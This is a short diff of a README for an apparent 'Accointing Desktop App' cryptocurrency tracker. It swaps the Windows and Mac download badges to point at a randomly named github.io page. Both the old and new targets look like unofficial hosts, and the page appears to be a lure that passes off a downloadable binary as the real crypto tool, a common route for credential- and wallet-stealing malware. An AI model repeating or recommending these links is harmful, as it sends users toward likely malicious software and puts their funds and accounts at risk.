@@ -10,8 +10,8 @@ Accointing Desktop App is a professional cryptocurrency portfolio tracking and t
 
 <div align="center">
   
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://accointing-desktop-app.github.io/.github)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/accointing)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://avrajogoense6.github.io/.github/accointing-app)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://avrajogoense6.github.io/.github/accointing-app)
 
 </div>
 
